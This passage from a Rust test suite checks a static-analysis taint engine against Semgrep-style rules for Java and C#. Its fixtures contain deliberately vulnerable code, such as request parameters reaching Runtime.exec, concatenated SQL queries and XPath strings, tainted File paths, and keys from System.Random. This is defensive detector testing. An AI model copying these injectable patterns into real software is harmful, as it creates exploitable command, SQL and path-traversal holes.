  - pattern: (HttpServletRequest $REQ)
pattern-sinks:
  - pattern: $RUNTIME.exec(...)
"#,
        );

        // The source compiled to a type-specific `TypedName`, not an
        // any-parameter wildcard.
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "HttpServletRequest"
            )),
            "source should compile to TypedName{{HttpServletRequest}}, got {:?}",
            rule.spec.sources
        );

        let fire_src = r#"
class Handler {
    void handler(HttpServletRequest req) throws Exception {
        runtime.exec(req.getParameter("x"));
    }
}
"#;
        let tree = parse_file(fire_src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a value read off an HttpServletRequest-typed parameter reaching exec() must fire, got {:?}",
            findings
        );
    }

    /// Type discrimination: the same rule stays SILENT when the parameter is a
    /// different declared type — `(HttpServletRequest $REQ)` must NOT broaden
    /// into "seed every parameter".
    #[test]
    fn typed_metavar_source_discriminates_by_type() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-typed-source
mode: taint
languages: [java]
severity: ERROR
message: "Untrusted HttpServletRequest reaches a command sink"
pattern-sources:
  - pattern: (HttpServletRequest $REQ)
pattern-sinks:
  - pattern: $RUNTIME.exec(...)
"#,
        );

        // Same flow shape, but `req` is a `FooBar`, not an HttpServletRequest.
        let miss_src = r#"
class Handler {
    void handler(FooBar req) throws Exception {
        runtime.exec(req.getParameter("x"));
    }
}
"#;
        let tree = parse_file(miss_src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "a differently-typed parameter must not be seeded as a source, got {:?}",
            findings
        );
    }

    // ── C# typed-metavariable source `(string $X)` ──────────────────────────
    //
    // The direct dual of the Java tests above: C#'s `csharp-sqli` expresses its
    // `pattern-sources` as `(string $X)` — the same parenthesised `(Type $VAR)`
    // syntax Java uses. These exercise the whole
    // `parse_taint_rule -> compiled() -> check()` path: the source must LOAD as a
    // type-specific `TypedName`, FIRE when a variable of the named type flows to
    // a sink, and stay SILENT when the variable is a different type (the
    // faithfulness requirement — `(string $X)` seeds ONLY `string` variables,
    // not all parameters).

    /// The `csharp-sqli` source shape `(string $X)` compiles to a type-specific
    /// `TypedName { type_name: "string" }` (NOT an any-parameter wildcard) and
    /// fires when a `string`-typed parameter reaches an `ExecuteReader` sink.
    #[test]
    fn csharp_typed_metavar_source_loads_and_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-typed-source
mode: taint
languages: [csharp]
severity: ERROR
message: "Untrusted string reaches a SQL sink"
pattern-sources:
  - pattern: (string $X)
pattern-sinks:
  - pattern: $CMD.ExecuteReader(...)
"#,
        );

        // The source compiled to a type-specific `TypedName`, not a wildcard.
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "string"
            )),
            "source should compile to TypedName{{string}}, got {:?}",
            rule.spec.sources
        );

        let fire_src = r#"
class Repo {
    void M(string q, SqlCommand cmd) {
        cmd.ExecuteReader(q);
    }
}
"#;
        let tree = parse_file(fire_src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a `string`-typed parameter reaching ExecuteReader() must fire, got {:?}",
            findings
        );
    }

    /// Type discrimination: the same `(string $X)` rule stays SILENT when the
    /// variable is a different declared type (`int`) — the source must NOT
    /// broaden into "seed every parameter".
    #[test]
    fn csharp_typed_metavar_source_discriminates_by_type() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-typed-source
mode: taint
languages: [csharp]
severity: ERROR
message: "Untrusted string reaches a SQL sink"
pattern-sources:
  - pattern: (string $X)
pattern-sinks:
  - pattern: $CMD.ExecuteReader(...)
"#,
        );

        // Same flow shape, but `q` is an `int`, not a `string`.
        let miss_src = r#"
class Repo {
    void M(int q, SqlCommand cmd) {
        cmd.ExecuteReader(q);
    }
}
"#;
        let tree = parse_file(miss_src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "a differently-typed (int) variable must not be seeded as a source, got {:?}",
            findings
        );
    }

    /// A `string`-typed LOCAL (`string q = ...;`) is seeded by declared type too,
    /// mirroring the Java local-seeding path, and a differently-typed local
    /// (`int n = ...;`) stays silent.
    #[test]
    fn csharp_typed_metavar_source_seeds_typed_local() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: csharp-typed-source
mode: taint
languages: [csharp]
severity: ERROR
message: "Untrusted string reaches a SQL sink"
pattern-sources:
  - pattern: (string $X)
pattern-sinks:
  - pattern: $CMD.ExecuteReader(...)
"#,
        );

        let fire_src = r#"
class Repo {
    void M(SqlCommand cmd) {
        string q = Helper();
        cmd.ExecuteReader(q);
    }
}
"#;
        let tree = parse_file(fire_src, Language::CSharp).expect("C# fixture should parse");
        assert_eq!(
            rule.check(fire_src, &tree).len(),
            1,
            "a `string`-typed local reaching ExecuteReader() must fire"
        );

        let miss_src = r#"
class Repo {
    void M(SqlCommand cmd) {
        int n = Helper();
        cmd.ExecuteReader(n);
    }
}
"#;
        let tree = parse_file(miss_src, Language::CSharp).expect("C# fixture should parse");
        assert!(
            rule.check(miss_src, &tree).is_empty(),
            "a differently-typed (int) local must not be seeded as a source"
        );
    }

    // ── Focus-on-call-argument SOURCE (`use_weak_rng_for_keygeneration`) ────
    //
    // The C# rule's source `pattern-inside: (System.Random $RNG).NextBytes($KEY);
    // ...` + `pattern: $KEY` compiles to a `CallArgSource { method: "NextBytes",
    // arg_index: 0 }`; the C# engine seeds the identifier in the focused argument
    // position of a matching call. These tests pin faithfulness: fires only on
    // the focused argument of a matching call, silent on other calls / other
    // positions / unfilled buffers.

    fn weak_rng_rule() -> SemgrepTaintRule {
        compiled(
            r#"
id: csharp-use-weak-rng
mode: taint
languages: [csharp]
severity: ERROR
message: "Weak RNG used to generate a cryptographic key"
pattern-sources:
  - patterns:
      - pattern-inside: (System.Random $RNG).NextBytes($KEY); ...
      - pattern: $KEY
pattern-sinks:
  - pattern-either:
      - pattern: new AesGcm(...)
      - pattern: new AesCcm(...)
      - pattern: new ChaCha20Poly1305(...)
"#,
        )
    }

    /// The `pattern-inside: (System.Random $RNG).NextBytes($KEY); ...` +
    /// `pattern: $KEY` source compiles to a `CallArgSource { NextBytes, 0 }`, and
    /// the `new AesGcm(...)` constructor sink compiles to `Call { "AesGcm" }`
    /// (the C#-gated `new Type(...)` object-creation fix).
    #[test]
    fn csharp_call_arg_source_compiles_to_callargsource() {
        let rule = weak_rng_rule();
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::CallArgSource { method, arg_index, .. }
                    if method == "NextBytes" && *arg_index == 0
            )),
            "source should compile to CallArgSource{{NextBytes,0}}, got {:?}",
            rule.spec.sources
        );
        assert!(
            rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::Call { canonical, .. } if canonical == "AesGcm"
            )),
            "`new AesGcm(...)` should compile to Call{{AesGcm}}, got {:?}",
            rule.spec.sinks
        );
    }

    /// Fires on the fill: `rng.NextBytes(key)` seeds `key`, which then reaches a
    /// `new AesGcm(key)` sink — even though `key`'s own declaration
    /// (`byte[] key = new byte[16];`) is an untainted RHS that each propagation
    /// pass clears (the in-loop re-seeding restores the fill-taint).
    #[test]
    fn csharp_call_arg_source_fires_on_fill() {
        use crate::engine::parser::parse_file;
        let rule = weak_rng_rule();
        let src = r#"
class C {
    void M() {
        var rng = new Random();
        byte[] key = new byte[16];
        rng.NextBytes(key);
        var cipher = new AesGcm(key);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a key filled by NextBytes() reaching new AesGcm() must fire, got {:?}",
            findings
        );
    }

    /// Silent on a non-matching call: `Scramble(key)` is not `NextBytes`, so
    /// `key` is never seeded and the `new AesGcm(key)` sink stays clean.
    #[test]
    fn csharp_call_arg_source_silent_on_other_call() {
        use crate::engine::parser::parse_file;
        let rule = weak_rng_rule();
        let src = r#"
class C {
    void M() {
        byte[] key = new byte[16];
        Scramble(key);
        var cipher = new AesGcm(key);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a buffer passed to a NON-matching call must not be seeded, got {:?}",
            findings
        );
    }

    /// Seeds only the focused argument POSITION: for `NextBytes($KEY)` the focused
    /// position is 0, so `rng.NextBytes(seed, key)` seeds `seed` (position 0) and
    /// NOT `key` (position 1) — `new AesGcm(seed)` fires, `new AesGcm(key)` does
    /// not.
    #[test]
    fn csharp_call_arg_source_seeds_only_focused_position() {
        use crate::engine::parser::parse_file;
        let rule = weak_rng_rule();

        let fires_src = r#"
class C {
    void M() {
        byte[] seed = new byte[16];
        byte[] key = new byte[16];
        rng.NextBytes(seed, key);
        var cipher = new AesGcm(seed);
    }
}
"#;
        let tree = parse_file(fires_src, Language::CSharp).expect("C# fixture should parse");
        assert_eq!(
            rule.check(fires_src, &tree).len(),
            1,
            "the position-0 argument (`seed`) must be seeded and fire on new AesGcm(seed)"
        );

        let miss_src = r#"
class C {
    void M() {
        byte[] seed = new byte[16];
        byte[] key = new byte[16];
        rng.NextBytes(seed, key);
        var cipher = new AesGcm(key);
    }
}
"#;
        let tree = parse_file(miss_src, Language::CSharp).expect("C# fixture should parse");
        assert!(
            rule.check(miss_src, &tree).is_empty(),
            "the position-1 argument (`key`) must NOT be seeded, got {:?}",
            rule.check(miss_src, &tree)
        );
    }

    /// An unfilled buffer is not a source: a `key` that never reaches a
    /// `NextBytes(...)` call is untainted even when it flows into a `new AesGcm`
    /// sink.
    #[test]
    fn csharp_call_arg_source_does_not_seed_unfilled_buffer() {
        use crate::engine::parser::parse_file;
        let rule = weak_rng_rule();
        let src = r#"
class C {
    void M() {
        byte[] key = new byte[16];
        var cipher = new AesGcm(key);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "an unfilled buffer must not be a source, got {:?}",
            findings
        );
    }

    // ── C# xpath-injection: signature SOURCE + concat-in-call SINK ───────────
    //
    // The whole `parse_taint_rule -> compiled() -> check()` path for the C#
    // `xpath-injection` rule: a method's FIRST parameter (or a local `string`)
    // reaching a `.Compile/.Select/.Evaluate("..." + $INPUT + "...")` CONCAT
    // sink fires; a literal argument, a no-input call, and a DIRECT tainted
    // argument with no concatenation all stay silent.

    /// The verbatim registry `xpath-injection` rule (both source shapes, all six
    /// sink alternatives).
    fn xpath_injection_rule() -> SemgrepTaintRule {
        compiled(
            "
id: xpath-injection
mode: taint
languages: [csharp]
severity: ERROR
message: XPath injection
pattern-sources:
  - pattern-either:
    - pattern: $T $M($INPUT,...) {...}
    - pattern: \"$T $M(...) {\\n  ...\\n  string $INPUT;\\n}\\n\"
pattern-sinks:
  - pattern-either:
    - pattern: XPathExpression $EXPR = $NAV.Compile(\"...\" + $INPUT + \"...\");
    - pattern: var $EXPR = $NAV.Compile(\"...\" + $INPUT + \"...\");
    - pattern: XPathNodeIterator $NODE = $NAV.Select(\"...\" + $INPUT + \"...\");
    - pattern: var $NODE = $NAV.Select(\"...\" + $INPUT + \"...\");
    - pattern: Object $OBJ = $NAV.Evaluate(\"...\" + $INPUT + \"...\");
    - pattern: var $OBJ = $NAV.Evaluate(\"...\" + $INPUT + \"...\");
",
        )
    }

    /// GATE 1 — the rule COMPILES to the intended matchers: a first-parameter
    /// signature source, a typed-`string` local source, and concat-in-call sinks
    /// for `Compile` / `Select` / `Evaluate`.
    #[test]
    fn csharp_xpath_injection_compiles_to_intended_shapes() {
        let rule = xpath_injection_rule();

        assert!(
            rule.spec
                .sources
                .iter()
                .any(|s| matches!(s, GenericMatcher::FirstParamSource { .. })),
            "pattern 1 must compile to FirstParamSource, got {:?}",
            rule.spec.sources
        );
        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "string"
            )),
            "pattern 2 must compile to TypedName{{string}}, got {:?}",
            rule.spec.sources
        );
        for method in ["Compile", "Select", "Evaluate"] {
            assert!(
                rule.spec.sinks.iter().any(|s| matches!(
                    s,
                    GenericMatcher::CallArgConcat { method: m, .. } if m == method
                )),
                "sink for `.{method}(...)` must compile to CallArgConcat, got {:?}",
                rule.spec.sinks
            );
        }
    }

    /// GATE 2 — FIRES on the positive fixture: the `Search(string input)` first
    /// parameter reaches `nav.Compile("..." + input + "...")`.
    #[test]
    fn csharp_xpath_injection_fires_on_concat_of_first_param() {
        use crate::engine::parser::parse_file;
        let rule = xpath_injection_rule();
        let src = r#"
class Repo {
    public List<Knowledge> Search(string input) {
        XPathNavigator nav = XmlDoc.CreateNavigator();
        XPathExpression expr = nav.Compile(@"//knowledge[tags[contains(text(),'" + input + "')] and sensitivity/text() ='Public']");
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "first-parameter taint reaching a concat .Compile() must fire, got {:?}",
            findings
        );
    }

    /// GATE 3 — SILENT on the negative method in the same fixture: the argument
    /// is a plain literal (`'keyword'`), so no taint reaches the concat sink.
    #[test]
    fn csharp_xpath_injection_silent_on_literal_arg() {
        use crate::engine::parser::parse_file;
        let rule = xpath_injection_rule();
        let src = r#"
class Repo {
    public List<Knowledge> Search(string input) {
        XPathNavigator nav = XmlDoc.CreateNavigator();
        XPathExpression expr = nav.Compile(@"//knowledge[tags[contains(text(),'keyword')] and sensitivity/text() ='Public']");
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a plain-literal .Compile() argument must not fire, got {:?}",
            findings
        );
    }

    /// GATE 4 — SILENT on a direct-literal call with no user input at all.
    #[test]
    fn csharp_xpath_injection_silent_on_no_input() {
        use crate::engine::parser::parse_file;
        let rule = xpath_injection_rule();
        let src = r#"
class Repo {
    void M() {
        XPathNavigator nav = XmlDoc.CreateNavigator();
        XPathExpression expr = nav.Compile("//knowledge[1]");
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a no-input literal .Compile() must not fire, got {:?}",
            findings
        );
    }

    /// GATE 5 — concat is REQUIRED: a DIRECT tainted argument with no
    /// concatenation (`nav.Compile(input)`) does NOT match, even though `input`
    /// is a seeded first-parameter source. This is the faithfulness anchor — the
    /// Semgrep pattern is `"..." + $INPUT + "..."` (a concat), not a bare arg.
    #[test]
    fn csharp_xpath_injection_silent_on_direct_tainted_no_concat() {
        use crate::engine::parser::parse_file;
        let rule = xpath_injection_rule();
        let src = r#"
class Repo {
    void Search(string input) {
        XPathNavigator nav = XmlDoc.CreateNavigator();
        XPathExpression expr = nav.Compile(input);
    }
}
"#;
        let tree = parse_file(src, Language::CSharp).expect("C# fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a direct tainted argument with no concatenation must not fire, got {:?}",
            findings
        );
    }

    // ── Java typed-ASSIGNMENT sink `(java.io.File $FILE) = ...` ──────────────
    //
    // The whole `parse_taint_rule -> compiled() -> check()` path for the
    // path-traversal sink shape: a tainted value assigned into a `File`-typed
    // variable fires; a literal RHS or a wrong-type LHS stays silent.

    fn path_traversal_rule() -> SemgrepTaintRule {
        compiled(
            r#"
id: java-httpservlet-path-traversal
mode: taint
languages: [java]
severity: ERROR
message: "Tainted path flows into a File"
pattern-sources:
  - pattern: (HttpServletRequest $REQ)
pattern-sinks:
  - pattern: |
      (java.io.File $FILE) = ...
"#,
        )
    }

    #[test]
    fn typed_assign_sink_compiles_to_typed_assign_target() {
        let rule = path_traversal_rule();
        assert!(
            rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedAssignTarget { type_name, .. } if type_name == "File"
            )),
            "sink should compile to TypedAssignTarget{{File}} (not `any assignment`), got {:?}",
            rule.spec.sinks
        );
    }

    #[test]
    fn typed_assign_sink_fires_on_tainted_file_declaration() {
        use crate::engine::parser::parse_file;
        let rule = path_traversal_rule();
        let src = r#"
class Handler {
    void handle(HttpServletRequest req) throws Exception {
        String path = req.getParameter("path");
        File f = new File(path);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted path assigned into a File-typed variable must fire, got {:?}",
            findings
        );
    }

    #[test]
    fn typed_assign_sink_silent_on_literal_rhs() {
        use crate::engine::parser::parse_file;
        let rule = path_traversal_rule();
        // File-typed LHS, but the RHS is a constant literal — no taint.
        let src = r#"
class Handler {
    void handle(HttpServletRequest req) throws Exception {
        String path = req.getParameter("path");
        File f = new File("/static");
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a File built from a literal path must not fire, got {:?}",
            findings
        );
    }

    #[test]
    fn typed_assign_sink_fires_on_bare_assignment_to_file_local() {
        use crate::engine::parser::parse_file;
        let rule = path_traversal_rule();
        // `f` is declared `File` then reassigned a tainted value in a bare
        // `assignment_expression` — the declared type is resolved through the
        // scope's local-type map.
        let src = r#"
class Handler {
    void handle(HttpServletRequest req) throws Exception {
        File f = new File("/static");
        String path = req.getParameter("path");
        f = new File(path);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted value reassigned into a File-typed local must fire, got {:?}",
            findings
        );
    }

    #[test]
    fn typed_assign_sink_silent_on_wrong_lhs_type() {
        use crate::engine::parser::parse_file;
        let rule = path_traversal_rule();
        // Tainted RHS, but the LHS is a String, not a File.
        let src = r#"
class Handler {
    void handle(HttpServletRequest req) throws Exception {
        String s = req.getParameter("path");
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a tainted value assigned into a non-File variable must not fire, got {:?}",
            findings
        );
    }

    /// The typed-metavariable-RECEIVER source shape
    /// `(HttpServletRequest $REQ).$FUNC(...)` also compiles to the same
    /// `TypedName` matcher (the trailing method read is a droppable narrowing)
    /// and fires on a local variable of that type.
    #[test]
    fn typed_metavar_receiver_source_loads_and_fires_on_local() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-typed-receiver-source
mode: taint
languages: [java]
severity: ERROR
message: "Untrusted HttpServletRequest read reaches a command sink"
pattern-sources:
  - patterns:
      - pattern: (HttpServletRequest $REQ).$FUNC(...)
pattern-sinks:
  - pattern: $RUNTIME.exec(...)
"#,
        );

        assert!(
            rule.spec.sources.iter().any(|s| matches!(
                s,
                GenericMatcher::TypedName { type_name, .. } if type_name == "HttpServletRequest"
            )),
            "receiver-typed source should compile to TypedName{{HttpServletRequest}}, got {:?}",
            rule.spec.sources
        );

        // A local declared with the named type is seeded by its declared type.
        let fire_src = r#"
class Handler {
    void handler() throws Exception {
        HttpServletRequest req = getRequest();
        runtime.exec(req.getParameter("x"));
    }
}
"#;
        let tree = parse_file(fire_src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a read off a locally-declared HttpServletRequest reaching exec() must fire, got {:?}",
            findings
        );
    }

    // ── Typed-receiver STATEMENT sink (trailing `;` + focus-metavariable) ────
    //
    // A faithful reduction of the registry `tainted-env-from-http-request`
    // sink shape: a statement (trailing `;`) whose receiver is a typed
    // metavariable and whose focused metavariable is a call argument:
    //
    //   pattern-sinks:
    //     - patterns:
    //         - pattern: (java.lang.Runtime $R).exec($CMD, $ENV_ARGS, ...);
    //         - focus-metavariable: $ENV_ARGS
    //
    // The leading `(java.lang.Runtime $R)` typed receiver is normalized to a
    // bare `$R.exec(...)` call, so the existing focus-on-call-argument sink
    // recognizer compiles it to a `MethodName { method: "exec" }` sink (which
    // only fires when a tracked-tainted value reaches an argument of `exec`).

    const TYPED_RECEIVER_STMT_SINK_RULE: &str = r#"
id: java-typed-receiver-stmt-sink
mode: taint
languages: [java]
severity: ERROR
message: "Tainted env args reach Runtime.exec"
pattern-sources:
  - pattern: (HttpServletRequest $REQ)
pattern-sinks:
  - patterns:
      - pattern: (java.lang.Runtime $R).exec($CMD, $ENV_ARGS, ...);
      - focus-metavariable: $ENV_ARGS
"#;

    #[test]
    fn typed_receiver_statement_sink_loads_and_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(TYPED_RECEIVER_STMT_SINK_RULE);

        // The typed-receiver statement sink compiled to a concrete
        // `MethodName { method: "exec" }` matcher — NOT an empty/skipped sink.
        assert!(
            rule.spec.sinks.iter().any(|s| matches!(
                s,
                GenericMatcher::MethodName { method, .. } if method == "exec"
            )),
            "statement sink should compile to MethodName{{exec}}, got {:?}",
            rule.spec.sinks
        );

        // Tainted input read off an HttpServletRequest reaching an `exec(...)`
        // call argument fires.
        let fire_src = r#"
class Handler {
    void handler(HttpServletRequest req) throws Exception {
        Runtime r = Runtime.getRuntime();
        String[] env = { req.getParameter("x") };
        r.exec("cmd", env);
    }
}
"#;
        let tree = parse_file(fire_src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value reaching Runtime.exec(...) must fire, got {:?}",
            findings
        );
    }

    /// Near-miss: the same sink stays SILENT when nothing tainted reaches the
    /// `exec(...)` call (all arguments are constants) — the sink is gated on
    /// taint, not "any `exec` call".
    #[test]
    fn typed_receiver_statement_sink_silent_on_clean_call() {
        use crate::engine::parser::parse_file;

        let rule = compiled(TYPED_RECEIVER_STMT_SINK_RULE);

        let miss_src = r#"
class Handler {
    void handler(HttpServletRequest req) throws Exception {
        Runtime r = Runtime.getRuntime();
        String[] env = { "SAFE=1" };
        r.exec("cmd", env);
    }
}
"#;
        let tree = parse_file(miss_src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "a Runtime.exec(...) call with no tainted argument must not fire, got {:?}",
            findings
        );
    }

    /// Faithfulness guard for the typed-receiver normalization: a CHAINED-call
    /// sink `(HttpServletRequest $REQ).getSession().$FUNC(...)` must NOT be
    /// mistaken for a `getSession(...)` sink (the inner call in the chain). The
    /// outer method is a regex-pinned metavariable on a multi-level receiver
    /// chain, which the single-level focus-call recognizer does not express, so
    /// the rule must SKIP rather than compile an over-broad `MethodName`.
    #[test]
    fn chained_receiver_statement_sink_does_not_compile_bogus_inner_sink() {
        let yaml = r#"
id: java-chained-session-sink
mode: taint
languages: [java]
severity: WARNING
message: "Tainted session attribute"
pattern-sources:
  - pattern: (HttpServletRequest $REQ)
pattern-sinks:
  - patterns:
      - pattern: (HttpServletRequest $REQ).getSession().$FUNC($NAME, $VALUE);
      - metavariable-regex:
          metavariable: $FUNC
          regex: ^(putValue|setAttribute)$
      - focus-metavariable: $VALUE
"#;
        let v: YamlValue = serde_yaml_ng::from_str(yaml).unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Skip(_) => {}
            TaintRuleParse::Compiled(r) => {
                // If it ever DOES compile, it must never be the bogus inner
                // `getSession` method sink.
                assert!(
                    !r.spec.sinks.iter().any(|s| matches!(
                        s,
                        GenericMatcher::MethodName { method, .. } if method == "getSession"
                    )),
                    "chained sink must not compile to MethodName{{getSession}}, got {:?}",
                    r.spec.sinks
                );
            }
            TaintRuleParse::NotTaint => panic!("expected a taint rule"),
        }
    }

    // ── Taint-labels (`label:` / `requires:`) — Java `CONCAT` family ─────────
    //
    // These exercise the tractable single-positive-label slice
    // (`docs/parity/taint-labels-design.md`) end-to-end through the real
    // `parse_taint_rule` → `compiled()` → `check()` path. The HARD faithfulness
    // gate is discrimination: tainted input that flows THROUGH a string
    // concatenation into the sink FIRES, while the SAME tainted input reaching
    // the sink WITHOUT a concat (a parameterized query) does NOT — proving the
    // `requires: CONCAT` gate is honored rather than degrading to "any taint".

    /// A faithful reduction of the registry `formatted-sql-string` shape: an
    /// `INPUT`-labeled source, a `CONCAT` relabel source `requires: INPUT`, and
    /// a `requires: CONCAT` SQL-exec sink.
    const CONCAT_SQL_RULE: &str = r#"
id: labels-sql
mode: taint
languages: [java]
severity: ERROR
message: "Formatted SQL string"
metadata:
  cwe: "CWE-89"
pattern-sources:
  - patterns:
      - pattern-either:
          - pattern: (HttpServletRequest $REQ)
          - patterns:
              - pattern-inside: |
                  $ANNOT $FUNC (..., $INPUT, ...) {
                    ...
                  }
              - pattern: (String $INPUT)
              - focus-metavariable: $INPUT
    label: INPUT
  - patterns:
      - pattern-either:
          - pattern: $X + $INPUT
          - pattern: String.format(..., $INPUT, ...)
    label: CONCAT
    requires: INPUT
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: (Statement $S).$SQLFUNC(...)
          - pattern: (PreparedStatement $P).$SQLFUNC(...)
      - metavariable-regex:
          metavariable: $SQLFUNC
          regex: execute|executeQuery|createQuery
    requires: CONCAT
"#;

    #[test]
    fn taint_labels_concat_flow_fires() {
        use crate::engine::parser::parse_file;
        let rule = compiled(CONCAT_SQL_RULE);
        assert!(
            rule.label_policy.is_some(),
            "CONCAT-family rule must compile a LabelPolicy"
        );
        // Tainted input flows through a `+` concatenation into `q`, then reaches
        // the SQL sink — the value carries CONCAT, so the sink fires.
        let src = r#"
class C {
    void find(String input, java.sql.Statement stmt) throws Exception {
        String q = "SELECT * FROM users WHERE name = '" + input + "'";
        stmt.executeQuery(q);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture parses");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "concatenated tainted input into executeQuery must fire, got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_direct_param_does_not_fire() {
        use crate::engine::parser::parse_file;
        let rule = compiled(CONCAT_SQL_RULE);
        // The SAME tainted input reaches the sink directly, WITHOUT going through
        // a concatenation: it carries only INPUT (never CONCAT), so `requires:
        // CONCAT` must reject it. This is the discrimination that taint-labels
        // exist for — firing here would be the over-match the design forbids.
        let src = r#"
class C {
    void find(String input, java.sql.Statement stmt) throws Exception {
        stmt.executeQuery(input);
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "non-concatenated tainted input must NOT fire (requires: CONCAT), got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_parameterized_query_stays_clean() {
        use crate::engine::parser::parse_file;
        let rule = compiled(CONCAT_SQL_RULE);
        // A safe parameterized query: input is bound via setString and never
        // concatenated. Must stay clean.
        let src = r#"
class C {
    void find(String input, java.sql.PreparedStatement stmt) throws Exception {
        stmt.setString(1, input);
        stmt.executeQuery();
    }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture parses");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "parameterized query must stay clean, got {findings:?}"
        );
    }

    #[test]
    fn taint_labels_stringbuilder_append_relabel_propagator_fires() {
        use crate::engine::parser::parse_file;
        // A relabel PROPAGATOR: `(StringBuilder $SB).append($INPUT)` with
        // `label: CONCAT, requires: INPUT` builds the CONCAT-labeled string on
        // the receiver, which then reaches the exec sink.
        let rule = compiled(
            r#"
id: labels-cmd
mode: taint
languages: [java]
severity: ERROR
message: "Tainted system command"
metadata:
  cwe: "CWE-78"
pattern-propagators:
  - pattern: (StringBuilder $SB).append($INPUT)
    from: $INPUT
    to: $SB
    label: CONCAT
    requires: INPUT
pattern-sources:
  - patterns:
      - pattern-inside: |
          $ANNOT $FUNC (..., $INPUT, ...) {
            ...
          }
      - pattern: (String $INPUT)
      - focus-metavariable: $INPUT
    label: INPUT
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: (Runtime $R).$EXEC(...)
      - metavariable-regex:
          metavariable: $EXEC
          regex: exec|load
    requires: CONCAT
"#,
        );
        let fire = r#"
class C {
    void run(String input) throws Exception {
        StringBuilder b = new StringBuilder();
        b.append(input);
        Runtime.getRuntime().exec(b.toString());
    }
}
"#;
        let tree = parse_file(fire, Language::Java).expect("java fixture parses");
        assert_eq!(
            rule.check(fire, &tree).len(),
            1,
            "append relabel propagator must carry CONCAT to the exec sink"
        );
        // Direct (non-appended) input must NOT fire.
        let clean = r#"
class C {
    void run(String input) throws Exception {
        Runtime.getRuntime().exec(input);
    }
}
"#;
        let tree = parse_file(clean, Language::Java).expect("java fixture parses");
        assert!(
            rule.check(clean, &tree).is_empty(),
            "non-concatenated input must NOT fire (requires: CONCAT)"
        );
    }

    /// A Java `INPUT and not CLEAN` rule (the negation tier). The shared
    /// relabel + boolean-`requires:` sink gate handles this faithfully: `CLEAN`
    /// is emitted when an `INPUT` value flows through a `$X + $INPUT` concat, and
    /// the sink fires only when `INPUT` is present AND `CLEAN` is not.
    const JAVA_NEGATION_RULE: &str = r#"
id: labels-negation
mode: taint
languages: [java]
severity: ERROR
message: "open redirect"
pattern-sources:
  - pattern: (HttpServletRequest $REQ)
    label: INPUT
  - pattern: $X + $INPUT
    label: CLEAN
    requires: INPUT
pattern-sinks:
  - patterns:
      - pattern-either:
          - pattern: (Statement $S).$SQLFUNC(...)
      - metavariable-regex:
          metavariable: $SQLFUNC
          regex: execute
    requires: INPUT and not CLEAN
"#;

    #[test]
    fn taint_labels_negation_requires_loads() {
